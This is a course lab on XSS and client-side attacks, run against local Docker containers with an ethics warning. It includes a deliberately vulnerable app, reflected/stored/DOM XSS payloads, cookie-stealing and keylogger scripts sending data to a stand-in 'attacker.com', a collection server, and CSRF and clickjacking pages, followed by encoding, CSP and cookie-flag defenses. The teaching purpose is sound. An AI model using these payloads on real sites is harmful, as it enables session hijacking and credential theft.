---
title: "Lab — XSS & Client-Side Attacks: Simulation with Docker"
course: SCIA-472
topic: Cross-Site Scripting & Client-Side Attacks
chapter: "12 (Week 12 — XSS & Client-Side Attacks)"
difficulty: "⭐⭐⭐"
estimated_time: "90–105 min"
tags:
  - xss
  - reflected-xss
  - stored-xss
  - dom-xss
  - csrf
  - clickjacking
  - cookie-theft
  - keylogger
  - csp
  - client-side
---

# Lab — XSS & Client-Side Attacks: Simulation with Docker

| Field | Details |
|-------|---------|
| **Course** | SCIA-472 — Hacking Exposed & Incident Response |
| **Topic** | Cross-Site Scripting (XSS) & Client-Side Attacks |
| **Difficulty** | ⭐⭐⭐ Advanced |
| **Estimated Time** | 90–105 minutes |
| **Requires** | Docker Desktop, terminal |

---

## Overview

Client-side attacks exploit the **browser as the execution environment**. Unlike server-side exploits, these attacks execute JavaScript in the victim's own browser — with full access to their session cookies, keystrokes, and DOM. XSS (Cross-Site Scripting) is the delivery mechanism; cookie theft, keylogging, and CSRF are the payloads.

In this lab you will:

- Deploy a **deliberately vulnerable web application** (`StudentBoard`) inside Docker
- Execute **Reflected, Stored, and DOM-Based XSS** attacks from the terminal
- Operate a **live attacker server** and receive stolen session cookies
- Simulate an **XSS keylogger** capturing typed passwords
- Demonstrate a **CSRF attack** draining a bank balance
- Map **Clickjacking** using missing security headers
- Prove each defense (output encoding, CSP, `HttpOnly`, `SameSite`) neutralizes the attack

Every command in this lab runs against **containers you launch on your own machine**. No external systems are touched.

---

!!! warning "Ethical Use — Read Before Proceeding"
    XSS attacks, cookie theft, and CSRF against systems you do not own or have explicit written authorization to test are federal crimes under the **Computer Fraud and Abuse Act (CFAA)**. Every attack in this lab targets only the containers running locally on your machine. Never apply these techniques to any site, application, or network without written authorization.

---

## Lab Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│  YOUR MACHINE (Docker host)                                          │
│                                                                      │
│  ┌─────────────────────┐      ┌────────────────────────────────┐    │
│  │  xss-target          │      │  attacker-c2                   │    │
│  │  StudentBoard        │      │  Cookie/Key Receiver           │    │
│  │  python:3.11-slim    │      │  python:3.11-slim              │    │
│  │  port 8080           │      │  port 8899                     │    │
│  │                      │      │                                │    │
│  │  /search  ← Reflected│      │  /steal  ← stolen cookies      │    │
│  │  /board   ← Stored   │      │  /k      ← keystrokes          │    │
│  │  /profile ← DOM      │      │  /dump   ← full keylog         │    │
│  └─────────────────────┘      └────────────────────────────────┘    │
│                                                                      │
│  ┌──────────────────────┐      ┌───────────────────────────────┐    │
│  │  csrf-bank            │      │  csp-demo                     │    │
│  │  SimpleBank (vuln)    │      │  CSP-Protected Server         │    │
│  │  port 7779            │      │  port 7778                    │    │
│  └──────────────────────┘      └───────────────────────────────┘    │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Learning Objectives

1. Distinguish Reflected, Stored, and DOM-Based XSS by mechanism and impact
2. Execute a live cookie-theft attack using XSS + an attacker C2 server
3. Build and observe an XSS keylogger capturing keystrokes
4. Demonstrate a CSRF attack on a vulnerable bank application
5. Map clickjacking exposure using missing `X-Frame-Options` headers
6. Apply output encoding, CSP, and cookie flags to defeat each attack vector

---

## Prerequisites

- Docker Desktop installed and running
- A terminal (PowerShell on Windows, Terminal on macOS/Linux)
- Basic HTML/JavaScript familiarity helpful but not required

---

## Part 1 — Environment Setup

### Step 1.1 — Create the vulnerable web application

Save the following Python application to a local directory. It is a deliberately vulnerable message board with no input sanitization — the attack surface for the entire lab.

```bash
mkdir -p ~/xss-lab && cat > ~/xss-lab/vuln_app.py << 'PYEOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, unquote
import html as html_lib

STORED_COMMENTS = []
STYLE = "body{font-family:sans-serif;max-width:800px;margin:40px auto;padding:20px;} .comment{background:#f0f0f0;padding:10px;margin:8px 0;border-radius:4px;}"

def page(content):
    return f"""<!DOCTYPE html><html>
<head><title>StudentBoard</title><style>{STYLE}</style></head>
<body>
<h1>StudentBoard - XSS Lab</h1>
<nav><a href="/">Home</a> | <a href="/search">Search</a> | <a href="/board">Board</a> | <a href="/profile">Profile</a></nav>
<hr>{content}</body></html>""".encode()

class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args): pass
    def send_html(self, content, code=200):
        body = page(content)
        self.send_response(code)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', len(body))
        self.end_headers()
        self.wfile.write(body)
    def do_GET(self):
        p = urlparse(self.path)
        qs = parse_qs(p.query)
        if p.path == '/search':
            q = unquote(qs.get('q', [''])[0])
            if q:
                self.send_html(f'<h2>Search: {q}</h2><p>No results for <b>{q}</b>.</p>')
            else:
                self.send_html('<h2>Search</h2><form><input name="q" placeholder="Search..."><button>Go</button></form>')
        elif p.path == '/board':
            ch = ''.join(f'<div class="comment">{c}</div>' for c in STORED_COMMENTS)
            self.send_html(f'<h2>Message Board</h2><form method="GET" action="/post"><input name="msg" placeholder="Post a message..." size="50"><button>Post</button></form>{ch}')
        elif p.path == '/post':
            msg = unquote(qs.get('msg', [''])[0])
            if msg:
                STORED_COMMENTS.append(msg)
            self.send_response(302)
            self.send_header('Location', '/board')
            self.end_headers()
        elif p.path == '/profile':
            name = unquote(qs.get('name', ['Guest'])[0])
            self.send_html(f'<h2>Profile</h2><p>Welcome, {name}!</p><script>var user="{name}"; document.write("Hello "+user);</script>')
        elif p.path == '/safe_search':
            q = html_lib.escape(unquote(qs.get('q', [''])[0]))
            self.send_html(f'<h2>Safe Search: {q}</h2><p>html.escape() applied - XSS neutralized.</p>')
        elif p.path == '/safe_board':
            ch = ''.join(f'<div class="comment">{html_lib.escape(c)}</div>' for c in STORED_COMMENTS)
            self.send_html(f'<h2>Safe Board (escaped output)</h2>{ch}')
        else:
            self.send_html('<h2>Welcome</h2><p>Use the nav links to explore XSS vulnerabilities.</p>')

if __name__ == '__main__':
    s = HTTPServer(('0.0.0.0', 8080), Handler)
    print('StudentBoard running on :8080', flush=True)
    s.serve_forever()
PYEOF
```

### Step 1.2 — Build the Docker image

```bash
cat > ~/xss-lab/Dockerfile << 'EOF'
FROM python:3.11-slim
WORKDIR /app
COPY vuln_app.py .
EXPOSE 8080
CMD ["python3", "vuln_app.py"]
EOF

docker build -t xss-target:lab ~/xss-lab/
```

**Expected output:**
```
Successfully built 8f5c4c9ef741
Successfully tagged xss-target:lab
```

### Step 1.3 — Launch the target application

```bash
docker run -d --name xss-target -p 8080:8080 xss-target:lab
sleep 2
curl -s http://localhost:8080/ | grep -o 'StudentBoard'
```

**Expected output:**
```
StudentBoard
```

The vulnerable `StudentBoard` application is now live at `http://localhost:8080`.

📸 **Screenshot checkpoint Xa:** Capture the `docker build` success message and the `curl` confirming `StudentBoard` is running.

---

## Part 2 — Reflected XSS

**Reflected XSS** occurs when a URL parameter is returned to the browser **unescaped** — the script executes in the victim's browser the moment they load the crafted URL.

### Step 2.1 — Basic script injection

The `/search` endpoint reflects the `q` parameter directly into the HTML response with no sanitization:

```bash
curl -s "http://localhost:8080/search?q=<script>alert(document.cookie)</script>" \
  | grep -o 'Search:.*</h2>'
```

**Expected output:**
```
Search: <script>alert(document.cookie)</script></h2>
```

The `<script>` tag is in the HTML response verbatim. In a real browser, this executes immediately and pops an alert showing the victim's session cookie.

### Step 2.2 — URL-encoded payload (bypassing basic WAF rules)

Many Web Application Firewalls (WAFs) look for the literal string `<script>`. URL encoding bypasses them:

```bash
# %3C = <   %3E = >   %2F = /
curl -s "http://localhost:8080/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" \
  | grep "<script>alert"
```

**Expected output:**
```
<h2>Search: <script>alert(1)</script></h2>...
```

### Step 2.3 — Alternative payloads (no `<script>` tag required)

```bash
echo "=== img onerror ==="
curl -s "http://localhost:8080/search?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E" \
  | grep -o 'Search:.*</h2>'

echo ""
echo "=== SVG onload ==="
curl -s "http://localhost:8080/search?q=%3Csvg+onload%3Dalert%281%29%3E" \
  | grep -o 'Search:.*</h2>'

echo ""
echo "=== Backtick bypass (evades quote filters) ==="
curl -s "http://localhost:8080/search?q=%3Cimg+src%3Dx+onerror%3Dalert%601%60%3E" \
  | grep -o 'Search:.*</h2>'
```

**Expected output:**
```
=== img onerror ===
Search: <img src=x onerror=alert(1)></h2>

=== SVG onload ===
Search: <svg onload=alert(1)></h2>

=== Backtick bypass (evades quote filters) ===
Search: <img src=x onerror=alert`1`></h2>
```

!!! info "Why multiple payload types matter"
    Filters that block `<script>` are defeated by `<img>`, `<svg>`, `<body>`, and dozens of other HTML event handlers. Real XSS testing requires a full payload wordlist, not a single vector.

📸 **Screenshot checkpoint Xb:** Capture all three alternative payload outputs showing the raw injection in the response.

---

## Part 3 — Stored XSS (Persistent)

**Stored XSS** is the most dangerous variant. The payload is saved to the server's database and executes in **every user's browser** who visits the page — no crafted link needed.

### Step 3.1 — Post a benign message (baseline)

```bash
curl -s "http://localhost:8080/post?msg=Hello+from+Alice" -L \
  | grep -o 'Hello from Alice'
```

**Expected output:** `Hello from Alice`

### Step 3.2 — Post a cookie-stealing XSS payload

```bash
# URL-encoded: <script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
curl -s "http://localhost:8080/post?msg=%3Cscript%3Enew%20Image%28%29.src%3D%27http%3A%2F%2Fattacker.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E" \
  -L > /dev/null
echo "Payload stored"
```

### Step 3.3 — Verify the payload is now served to ALL visitors

```bash
curl -s "http://localhost:8080/board" \
  | grep -oP '(?<=comment">).*?(?=</div>)' | head -5
```

**Expected output:**
```
Hello from Alice
<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
```

Every future visitor to `/board` will have their cookie sent to `attacker.com`. This is a **persistent, weaponized attack** — unlike reflected XSS, the victim does not need to click a special link.

📸 **Screenshot checkpoint Xc:** Capture the board output showing the stored XSS script tag alongside the benign comment.

---

## Part 4 — Live Cookie Theft (Attacker C2 Server)

This part is the full end-to-end simulation: a real attacker server runs in a second container and **receives stolen cookies** from the XSS payload.

### Step 4.1 — Launch the attacker's collection server

```bash
docker run -d --name attacker-c2 -p 8899:8080 python:3.11-slim \
  python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class H(BaseHTTPRequestHandler):
    def log_message(self, f, *a): pass
    def do_GET(self):
        path = urllib.parse.unquote(self.path)
        if '/steal' in path:
            print('[ATTACKER] COOKIE RECEIVED:', path, flush=True)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'ok')

HTTPServer(('0.0.0.0', 8080), H).serve_forever()
"
sleep 2
echo "Attacker C2 server ready on port 8899"
```

**Expected output:** `Attacker C2 server ready on port 8899`

### Step 4.2 — Simulate victim's browser executing the XSS payload

The XSS payload in the victim's browser fires a request like this to the attacker's server. We simulate it with `curl`:

```bash
VICTIM_COOKIE="SESSIONID=deadbeef1234; user=alice; role=admin; admin=true"
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$VICTIM_COOKIE'))")

echo "Simulating XSS payload executing in victim browser..."
echo "Payload: new Image().src='http://attacker.com/steal?c='+encodeURIComponent(document.cookie)"
echo ""
curl -s "http://localhost:8899/steal?c=${ENCODED}" > /dev/null
sleep 1
```

### Step 4.3 — View stolen cookie on attacker server

```bash
docker logs attacker-c2 2>&1
```

**Expected output:**
```
[ATTACKER] COOKIE RECEIVED: /steal?c=SESSIONID=deadbeef1234; user=alice; role=admin; admin=true
```

!!! danger "Real-World Impact"
    With `SESSIONID=deadbeef1234` the attacker opens their browser, sets this cookie manually, and is now logged in as Alice with admin privileges — **no password required**. This is session hijacking via XSS.

📸 **Screenshot checkpoint Xd:** Capture the `docker logs attacker-c2` output showing the stolen cookie with all fields.

---

## Part 5 — DOM-Based XSS

**DOM XSS** occurs when JavaScript on the page uses attacker-controlled data **without sanitization** — the server never sees the payload, making server-side WAFs blind to it.

### Step 5.1 — Normal profile page

```bash
curl -s "http://localhost:8080/profile?name=Alice" | grep -E 'var user|Welcome'
```

**Expected output:**
```
<p>Welcome, Alice!</p><script>var user="Alice"; document.write("Hello "+user);</script>
```

The `name` parameter is injected directly into a JavaScript string: `var user="Alice"`.

### Step 5.2 — Break out of the JavaScript string

```bash
# Payload: Alice";alert(document.cookie);//
# The " closes the string, ; separates statements, // comments out the rest
curl -s "http://localhost:8080/profile?name=Alice%22%3Balert%28document.cookie%29%3B%2F%2F" \
  | grep "var user"
```

**Expected output:**
```
<script>var user="Alice";alert(document.cookie);//"; document.write("Hello "+user);</script>
```

The injected JavaScript now reads: `var user="Alice";alert(document.cookie);//` — **the alert fires**. The `//` comments out the rest of the original code.

📸 **Screenshot checkpoint Xe:** Capture the DOM XSS output showing how the JavaScript string is broken and the payload appended.

---

## Part 6 — XSS Keylogger

An XSS keylogger captures every keystroke the victim types — passwords, credit card numbers, messages — and sends them to the attacker in real time.

### Step 6.1 — Launch the keylogger receiver

```bash
docker run -d --name keylog-server -p 8900:8080 python:3.11-slim \
  python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, unquote

KEYLOG = []

class H(BaseHTTPRequestHandler):
    def log_message(self, f, *a): pass
    def do_GET(self):
        p = urlparse(self.path)
        qs = parse_qs(p.query)
        if p.path == '/k':
            key = unquote(qs.get('k', [''])[0])
            KEYLOG.append(key)
            print(f'KEY: {repr(key)}', flush=True)
        elif p.path == '/dump':
            print(f'FULL KEYLOG: {chr(0).join(KEYLOG)}', flush=True)
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b'')

HTTPServer(('0.0.0.0', 8080), H).serve_forever()
"
sleep 2
echo "Keylogger receiver ready on port 8900"
```

### Step 6.2 — The XSS keylogger payload

This is the JavaScript the attacker injects via XSS into the victim's page:

```javascript
// Keylogger payload (attacker injects this via XSS)
<script>
document.onkeypress = function(e) {
    new Image().src = "http://attacker.com/k?k=" + encodeURIComponent(e.key);
}
</script>
```

### Step 6.3 — Simulate victim typing a password

```bash
echo "Simulating victim typing password into XSS-infected page..."
for key in p a s s w o r d 1 2 3; do
  curl -s "http://localhost:8900/k?k=$key" > /dev/null
done
curl -s "http://localhost:8900/dump" > /dev/null
sleep 1

echo ""
echo "=== Attacker receives keystrokes ==="
docker logs keylog-server 2>&1
```

**Expected output:**
```
KEY: 'p'
KEY: 'a'
KEY: 's'
KEY: 's'
KEY: 'w'
KEY: 'o'
KEY: 'r'
KEY: 'd'
KEY: '1'
KEY: '2'
KEY: '3'
FULL KEYLOG: password123
```

!!! danger "Severity"
    A single XSS vulnerability on a banking or email login page, combined with this keylogger payload, captures credentials for every user who visits while the payload is live — potentially thousands of accounts.

📸 **Screenshot checkpoint Xf:** Capture the `docker logs keylog-server` output showing individual keystrokes and the full reconstructed `FULL KEYLOG: password123`.

---

## Part 7 — CSRF (Cross-Site Request Forgery)

**CSRF** tricks an authenticated victim's browser into sending a forged request to a legitimate site. The browser automatically includes the victim's session cookies — the server cannot distinguish the forged request from a legitimate one.

### Step 7.1 — Launch the vulnerable bank application

```bash
docker run -d --name csrf-bank -p 7779:8080 python:3.11-slim \
  python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

BALANCE = [1000]

class H(BaseHTTPRequestHandler):
    def log_message(self, f, *a): pass
    def do_GET(self):
        p = urlparse(self.path)
        qs = parse_qs(p.query)
        if p.path == '/balance':
            body = f'Account balance: \$\{BALANCE[0]\}'.encode()
        elif p.path == '/transfer':
            to = qs.get('to', ['?'])[0]
            amount = int(qs.get('amount', ['0'])[0])
            BALANCE[0] -= amount
            body = f'Transferred \$\{amount\} to \{to\}. New balance: \$\{BALANCE[0]\}'.encode()
            print(f'TRANSFER: \$\{amount\} to \{to\}', flush=True)
        else:
            body = b'SimpleBank - /balance or /transfer?to=X&amount=Y'
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(body)

HTTPServer(('0.0.0.0', 8080), H).serve_forever()
"
sleep 2
echo "SimpleBank running on port 7779"
```

### Step 7.2 — Check initial balance

```bash
curl -s "http://localhost:7779/balance"
```

**Expected output:** `Account balance: $1000`

### Step 7.3 — Legitimate transfer

```bash
curl -s "http://localhost:7779/transfer?to=Alice&amount=100"
```

**Expected output:** `Transferred $100 to Alice. New balance: $900`

### Step 7.4 — CSRF attack: malicious page triggers unauthorized transfer

The attacker's malicious page contains hidden HTML that automatically fires when the victim visits:

```html
<!-- Malicious page the attacker sends the victim -->
<html>
<body onload="document.getElementById('f').submit()">
  <form id="f" action="http://localhost:7779/transfer" method="GET">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="500">
  </form>
</body>
</html>
```

Simulating the forged request (what the victim's browser sends automatically):

```bash
echo "CSRF attack — forged transfer fires silently in victim's browser:"
curl -s "http://localhost:7779/transfer?to=attacker&amount=500"
echo ""
echo "Final balance after CSRF:"
curl -s "http://localhost:7779/balance"
```

**Expected output:**
```
CSRF attack — forged transfer fires silently in victim's browser:
Transferred $500 to attacker. New balance: $400

Final balance after CSRF:
Account balance: $400
```

The victim lost $500 without clicking anything suspicious — just visiting the attacker's page.

📸 **Screenshot checkpoint Xg:** Capture all three outputs: initial balance ($1000), post-legitimate-transfer ($900), and post-CSRF balance ($400).

---

## Part 8 — Clickjacking

**Clickjacking** overlays an invisible iframe of a legitimate site over a fake button on a malicious page. The victim thinks they are clicking the attacker's button but actually clicks the legitimate site's action.

### Step 8.1 — Launch the CSP-protected server

```bash
docker run -d --name csp-demo -p 7778:8080 python:3.11-slim \
  python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler

class H(BaseHTTPRequestHandler):
    def log_message(self, f, *a): pass
    def do_GET(self):
        body = b'<html><body><h1>Protected</h1></body></html>'
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Security-Policy', \"default-src 'self'; script-src 'nonce-abc123'\")
        self.send_header('X-Content-Type-Options', 'nosniff')
        self.send_header('X-Frame-Options', 'DENY')
        self.send_header('X-XSS-Protection', '1; mode=block')
        self.end_headers()
        self.wfile.write(body)

HTTPServer(('0.0.0.0', 8080), H).serve_forever()
"
sleep 2
```

### Step 8.2 — Compare security headers: vulnerable vs. protected

```bash
echo "=== StudentBoard (vulnerable — missing security headers) ==="
curl -v http://localhost:8080/ 2>&1 | grep "^< " | grep -iE "x-frame|csp|content-security|x-xss" \
  || echo "  [NONE] X-Frame-Options missing — site CAN be framed!"

echo ""
echo "=== CSP-Protected server (hardened) ==="
curl -v http://localhost:7778/ 2>&1 | grep -iE "< x-frame|< content-security|< x-content|< x-xss"
```

**Expected output:**
```
=== StudentBoard (vulnerable — missing security headers) ===
  [NONE] X-Frame-Options missing — site CAN be framed!

=== CSP-Protected server (hardened) ===
< Content-Security-Policy: default-src 'self'; script-src 'nonce-abc123'
< X-Content-Type-Options: nosniff
< X-Frame-Options: DENY
< X-XSS-Protection: 1; mode=block
```

### Step 8.3 — The Clickjacking attack HTML

```bash
echo "Clickjacking attack page structure:"
cat << 'HTMLEOF'
<html>
<body>
  <h1>Win a $500 Amazon Gift Card! Click below:</h1>
  <!--
    Invisible iframe positioned EXACTLY over the "CLAIM PRIZE" button.
    The victim sees the prize button but clicks the bank's Transfer button.
  -->
  <iframe src="http://bank.com/transfer?amount=1000&to=attacker"
          style="opacity:0.0; position:absolute; top:60px; left:100px;
                 width:200px; height:50px; z-index:9999; pointer-events:all;">
  </iframe>
  <button style="position:absolute; top:60px; left:100px; width:200px; height:50px;">
    CLAIM PRIZE!
  </button>
</body>
</html>
HTMLEOF
echo ""
echo "Defense: X-Frame-Options: DENY makes this iframe blank — attack fails."
```

📸 **Screenshot checkpoint Xh:** Capture both the missing-header output (StudentBoard) and the full security headers output (CSP server).

---

## Part 9 — Defense: Output Encoding

Proper output encoding **neutralizes XSS at the point of reflection** by converting `<`, `>`, `"`, and `'` into their HTML entity equivalents.

### Step 9.1 — Same XSS payload against the safe endpoint

```bash
echo "=== Vulnerable endpoint (raw reflection) ==="
curl -s "http://localhost:8080/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" \
  | grep -o 'Search:.*</h2>'

echo ""
echo "=== Safe endpoint (html.escape applied) ==="
curl -s "http://localhost:8080/safe_search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" \
  | grep -o 'Safe Search:.*</h2>'
```

**Expected output:**
```
=== Vulnerable endpoint (raw reflection) ===
Search: <script>alert(1)</script></h2>

=== Safe endpoint (html.escape applied) ===
Safe Search: &lt;script&gt;alert(1)&lt;/script&gt;</h2>
```

### Step 9.2 — Understand what html.escape does

```bash
python3 -c "
import html
payload = '<script>alert(document.cookie)</script>'
safe    = html.escape(payload)
print('Original:', payload)
print('Escaped: ', safe)
print()
print('Character mappings:')
print('  <  -->  &lt;')
print('  >  -->  &gt;')
print('  \"  -->  &quot;')
print(\"  '  -->  &#x27;\")
print()
print('Browser renders &lt;script&gt; as visible TEXT, not executable code.')
print('XSS neutralized.')
"
```

**Expected output:**
```
Original: <script>alert(document.cookie)</script>
Escaped:  &lt;script&gt;alert(document.cookie)&lt;/script&gt;

Character mappings:
  <  -->  &lt;
  >  -->  &gt;
  "  -->  &quot;
  '  -->  &#x27;

Browser renders &lt;script&gt; as visible TEXT, not executable code.
XSS neutralized.
```

📸 **Screenshot checkpoint Xi:** Capture both the vulnerable and safe endpoint outputs side-by-side, plus the `html.escape` explanation.

---

## Part 10 — Defense: Content Security Policy (CSP)

CSP is an HTTP response header that tells the browser **which sources of JavaScript are trusted**. Inline scripts injected by XSS have no nonce and are rejected by the browser.

### Step 10.1 — Verify CSP header

```bash
curl -v http://localhost:7778/ 2>&1 | grep "< Content-Security-Policy"
```

**Expected output:**
```
< Content-Security-Policy: default-src 'self'; script-src 'nonce-abc123'
```

### Step 10.2 — Understand how CSP defeats XSS

```bash
python3 -c "
print('=== CSP: How nonce-based policy blocks XSS ===')
print()
print('Server sends:')
print('  Content-Security-Policy: script-src nonce-abc123')
print()
print('Legitimate script (allowed):')
print('  <script nonce=\"abc123\">/* application code */</script>')
print()
print('XSS payload (blocked — no nonce):')
print('  <script>document.location=\"http://attacker.com/c?\"+document.cookie</script>')
print('  Browser error: Refused to execute inline script because it violates CSP')
print()
print('Attack requirement to bypass: know the nonce value')
print('Defense: nonce is regenerated for EVERY response — attacker cannot predict it')
print()
print('Additional CSP directives:')
print('  default-src       - fallback for all resource types')
print('  script-src        - controls JavaScript sources')
print('  connect-src       - controls fetch/XHR destinations (stops data exfil)')
print('  frame-ancestors   - replaces X-Frame-Options (stops clickjacking)')
"
```

📸 **Screenshot checkpoint Xj:** Capture the CSP header output and the nonce explanation showing how XSS is blocked.

---

## Part 11 — Defense: Cookie Security Flags

Even if XSS executes, **cookie security flags** limit what the attacker can steal.

### Step 11.1 — Compare cookie flags

```bash
python3 -c "
print('=== Cookie Security Flags =====')
print()
cookies = [
    ('Insecure (no flags)',
     'Set-Cookie: SESSIONID=abc123',
     ['Readable by JavaScript (document.cookie)',
      'Sent over HTTP (sniffable)',
      'Sent on cross-site requests (CSRF vulnerable)']),
    ('HttpOnly',
     'Set-Cookie: SESSIONID=abc123; HttpOnly',
     ['NOT readable by JavaScript — XSS cookie theft BLOCKED',
      'Still sent over HTTP and cross-site']),
    ('Secure',
     'Set-Cookie: SESSIONID=abc123; Secure',
     ['Only sent over HTTPS — prevents network sniffing',
      'Still readable by JS, still cross-site']),
    ('SameSite=Strict',
     'Set-Cookie: SESSIONID=abc123; SameSite=Strict',
     ['NOT sent on cross-site requests — CSRF BLOCKED',
      'Still readable by JS if no HttpOnly']),
    ('All flags (production)',
     'Set-Cookie: SESSIONID=abc123; HttpOnly; Secure; SameSite=Strict',
     ['Cookie theft via XSS: BLOCKED (HttpOnly)',
      'Network sniffing: BLOCKED (Secure)',
      'CSRF: BLOCKED (SameSite=Strict)',
      'This is the correct production configuration']),
]

for name, header, effects in cookies:
    print(f'--- {name} ---')
    print(f'  {header}')
    for e in effects:
        print(f'  + {e}')
    print()
"
```

**Expected output:**
```
=== Cookie Security Flags =====

--- Insecure (no flags) ---
  Set-Cookie: SESSIONID=abc123
  + Readable by JavaScript (document.cookie)
  + Sent over HTTP (sniffable)
  + Sent on cross-site requests (CSRF vulnerable)

--- HttpOnly ---
  Set-Cookie: SESSIONID=abc123; HttpOnly
  + NOT readable by JavaScript — XSS cookie theft BLOCKED
  ...
--- All flags (production) ---
  Set-Cookie: SESSIONID=abc123; HttpOnly; Secure; SameSite=Strict
  + Cookie theft via XSS: BLOCKED (HttpOnly)
  + Network sniffing: BLOCKED (Secure)
  + CSRF: BLOCKED (SameSite=Strict)
  + This is the correct production configuration
```

📸 **Screenshot checkpoint Xk:** Capture the full cookie flags comparison output showing all five configurations.

---

## Cleanup

```bash
docker rm -f xss-target attacker-c2 keylog-server csrf-bank csp-demo 2>/dev/null
docker rmi xss-target:lab 2>/dev/null
docker system prune -f
echo "All lab containers removed"
```

---

## Assessment

### Screenshot Checklist

| ID | Description | Points |
|----|-------------|--------|
| **Xa** | Docker build success + `curl` confirming StudentBoard running | 4 |
| **Xb** | Three alternative XSS payloads (img, SVG, backtick) in response | 6 |
| **Xc** | Board showing stored XSS script alongside benign comment | 6 |
| **Xd** | Attacker C2 `docker logs` showing full stolen cookie | 8 |
| **Xe** | DOM XSS — JavaScript string broken, payload appended | 6 |
| **Xf** | Keylogger output — individual KEY entries + `FULL KEYLOG: password123` | 8 |
| **Xg** | CSRF bank: $1000 → $900 → $400 across three commands | 6 |
| **Xh** | Clickjacking: missing headers (StudentBoard) vs. full headers (CSP server) | 4 |
| **Xi** | Vulnerable vs. safe search: raw `<script>` vs. `&lt;script&gt;` | 6 |
| **Xj** | CSP header + nonce explanation output | 4 |
| **Xk** | Cookie flags comparison — all five configurations | 2 |
| | **Screenshot subtotal** | **60** |

!!! tip "Grading Rubric"
    | Component | Points |
    |-----------|--------|
    | Screenshots (Xa–Xk) | 60 |
    | Reflection Questions (4 × 10 pts) | 40 |
    | **Total** | **100** |

---

## Reflection Questions

Answer each question in **150–200 words**.

!!! question "Q1 — Stored vs. Reflected XSS Impact"
    In Part 2 you executed Reflected XSS; in Part 3 you executed Stored XSS. The payloads were identical — the vulnerability mechanism was the same — but the attack surfaces are completely different. Explain: (a) why a Stored XSS on a comment field is **categorically more dangerous** than a Reflected XSS in a search field even if both steal session cookies, (b) how the **MITRE ATT&CK** technique T1059.007 (JavaScript) maps to what you observed, and (c) what business context (banking site, healthcare portal, social network) would make Stored XSS a **P1/Critical incident** and why.

!!! question "Q2 — Cookie Theft to Account Takeover"
    In Part 4 you saw the attacker's server receive `SESSIONID=deadbeef1234; role=admin`. Walk through the **complete attack kill chain** from XSS injection to full account takeover: (a) how does the attacker use the stolen SESSIONID in their own browser (be specific about which browser DevTools feature they use), (b) why does `HttpOnly` defeat this specific attack path entirely, and (c) if `HttpOnly` was set but `SameSite` was not, which attack from this lab would **still succeed** and why?

!!! question "Q3 — CSRF and Same-Origin Policy"
    In Part 7 the forged bank transfer succeeded because the browser automatically attached the victim's cookie to every request to the bank domain. (a) Explain what the **Same-Origin Policy (SOP)** does and does NOT prevent — why does SOP not stop CSRF? (b) Explain how `SameSite=Strict` defeats CSRF at the cookie level, (c) explain how a **CSRF token** defeats it at the application level, and (d) if both defenses were present, what would an attacker need to break them?

!!! question "Q4 — Defense in Depth for Client-Side Attacks"
    You deployed four defenses: output encoding, CSP, `HttpOnly`, and `SameSite=Strict`. A security architect claims: *"Just add a WAF in front of the app and you don't need these application-level controls."* Write a professional rebuttal: (a) explain two specific bypass techniques from this lab that a WAF would miss, (b) explain why CSP provides **browser-enforced** protection that a WAF cannot replicate, and (c) describe the principle of **defense in depth** and argue why all four controls should be deployed simultaneously even though any single one provides partial protection.
